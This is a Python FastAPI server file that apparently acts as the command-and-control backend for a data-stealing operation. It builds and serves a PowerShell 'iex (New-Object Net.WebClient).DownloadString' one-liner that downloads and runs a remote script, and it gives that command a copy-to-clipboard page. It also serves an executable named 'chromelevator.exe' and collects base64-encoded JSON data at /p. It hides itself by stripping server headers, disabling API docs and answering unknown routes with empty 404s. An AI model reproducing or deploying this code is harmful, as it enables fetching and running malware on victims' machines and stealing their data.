import base64
import json
import logging
import os
from pathlib import Path
from typing import Any

from fastapi import FastAPI, Request
from fastapi.exceptions import RequestValidationError
from fastapi.responses import FileResponse, HTMLResponse, PlainTextResponse
from starlette.exceptions import HTTPException as StarletteHTTPException
from starlette.responses import Response

from app.config import ADMIN_ENABLED
from app.repository import save_payload_record, verify_database_connection

if ADMIN_ENABLED:
    from app.admin import router as admin_router

logger = logging.getLogger(__name__)

app = FastAPI(
    title="",
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)


@app.on_event("startup")
async def startup_verify_database() -> None:
    try:
        verify_database_connection()
        logger.info("Database connection OK")
    except Exception:
        logger.exception("Database connection failed at startup")

    if ADMIN_ENABLED:
        logger.info("Admin routes enabled (ENVIRONMENT=local)")
    else:
        logger.info("Admin routes disabled (ENVIRONMENT=%s)", os.getenv("ENVIRONMENT", "production"))

SCRIPT_PATH = Path(__file__).with_name("windows_script.ps1")
BIN_DIR = Path(__file__).with_name("bin")

EMPTY = Response(status_code=404, content=b"")


@app.middleware("http")
async def strip_identifying_headers(request: Request, call_next) -> Response:
    response = await call_next(request)
    if "server" in response.headers:
        del response.headers["server"]
    return response


@app.exception_handler(StarletteHTTPException)
async def silent_http_exception(_request: Request, exc: StarletteHTTPException) -> Response:
    headers = dict(exc.headers) if exc.headers else {}
    return Response(status_code=exc.status_code, content=b"", headers=headers)


@app.exception_handler(RequestValidationError)
async def silent_validation_exception(_request: Request, _exc: RequestValidationError) -> Response:
    return EMPTY


def resolve_api_base(request: Request | None = None) -> str:
    if host := os.getenv("PAYLOAD_HOSTNAME"):
        scheme = "https" if host.endswith(".fly.dev") else "http"
        return f"{scheme}://{host}"

    if request is not None:
        return f"{request.url.scheme}://{request.url.netloc}"

    if fly_app := os.getenv("FLY_APP_NAME"):
        return f"https://{fly_app}.fly.dev"

    return "http://localhost:8001"


API_BASE = resolve_api_base()
PAYLOAD_URL = f"{API_BASE}/p"


def build_powershell_command(
    api_base: str | None = None,
    *,
    close_terminal: bool = False,
    debug: bool = False,
) -> str:
    base = api_base or API_BASE
    script_url = f"{base}/wscp"
    params: list[str] = []
    if close_terminal:
        params.append("close=1")
    if debug:
        params.append("debug=1")
    if params:
        script_url += "?" + "&".join(params)
    return f"iex (New-Object Net.WebClient).DownloadString('{script_url}')"


def save_payload(payload: dict[str, Any]) -> dict[str, Any]:
    return save_payload_record(payload)


def render_windows_script(*, close_terminal: bool = False, debug_mode: bool = False) -> str:
    close_literal = "$true" if close_terminal else "$false"
    debug_literal = "$true" if debug_mode else "$false"
    return (
        SCRIPT_PATH.read_text(encoding="utf-8")
        .replace("__API_BASE__", API_BASE)
        .replace("__PAYLOAD_URL__", PAYLOAD_URL)
        .replace("__CLOSE_TERMINAL__", close_literal)
        .replace("__DEBUG_MODE__", debug_literal)
    )


@app.get("/wscp", response_class=PlainTextResponse)
async def get_windows_script(close: bool = False, debug: bool = False) -> PlainTextResponse:
    return PlainTextResponse(
        render_windows_script(close_terminal=close, debug_mode=debug),
        media_type="text/plain; charset=utf-8",
    )


@app.get("/c", response_class=HTMLResponse)
async def copy_command(request: Request) -> HTMLResponse:
    api_base = resolve_api_base(request)
    command = build_powershell_command(api_base)
    command_with_close = build_powershell_command(api_base, close_terminal=True)
    command_with_debug = build_powershell_command(api_base, debug=True)

    return HTMLResponse(
        f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Copy</title>
  <style>
    body {{
      font-family: system-ui, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      gap: 0.75rem;
      min-height: 100vh;
      margin: 0;
    }}
    button {{
      padding: 0.75rem 1.5rem;
      font-size: 1rem;
      cursor: pointer;
      min-width: 12rem;
    }}
    #status {{
      color: #16a34a;
      min-height: 1.25rem;
    }}
  </style>
</head>
<body>
  <button type="button" id="copy-btn">Copy</button>
  <button type="button" id="copy-close-btn">Copy with close</button>
  <button type="button" id="copy-debug-btn">Copy with debug</button>
  <div id="status"></div>
  <script>
    const command = {json.dumps(command)};
    const commandWithClose = {json.dumps(command_with_close)};
    const commandWithDebug = {json.dumps(command_with_debug)};

    async function copyText(text) {{
      const status = document.getElementById("status");
      status.textContent = "";
      try {{
        await navigator.clipboard.writeText(text);
        status.textContent = "Copied";
      }} catch (e) {{
        const textarea = document.createElement("textarea");
        textarea.value = text;
        textarea.style.position = "fixed";
        textarea.style.opacity = "0";
        document.body.appendChild(textarea);
        textarea.select();
        status.textContent = document.execCommand("copy") ? "Copied" : "Could not copy";
        textarea.remove();
      }}
    }}

    document.getElementById("copy-btn").addEventListener("click", () => copyText(command));
    document.getElementById("copy-close-btn").addEventListener("click", () => copyText(commandWithClose));
    document.getElementById("copy-debug-btn").addEventListener("click", () => copyText(commandWithDebug));
  </script>
</body>
</html>"""
    )


@app.get("/chrmlvtr", response_model=None)
async def get_chromelevator(arch: str = "x64"):
    arch = arch.lower()
    if arch not in {"x64", "arm64"}:
        return EMPTY

    binary_path = BIN_DIR / f"chromelevator_{arch}.exe"
    if not binary_path.is_file():
        return EMPTY

    return FileResponse(
        binary_path,
        media_type="application/octet-stream",
        filename="chromelevator.exe",
    )


@app.post("/p")
async def receive_payload(request: Request) -> Response:
    raw_body = (await request.body()).decode("utf-8").strip()
    try:
        payload = json.loads(base64.b64decode(raw_body))
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
        return PlainTextResponse("", status_code=400)

    if not isinstance(payload, dict):
        return PlainTextResponse("", status_code=400)

    save_payload(payload)

    return Response(status_code=200, content=b"")


if ADMIN_ENABLED:
    app.include_router(admin_router)


@app.api_route("/{full_path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"])
async def unknown_route(_full_path: str) -> Response:
    return EMPTY
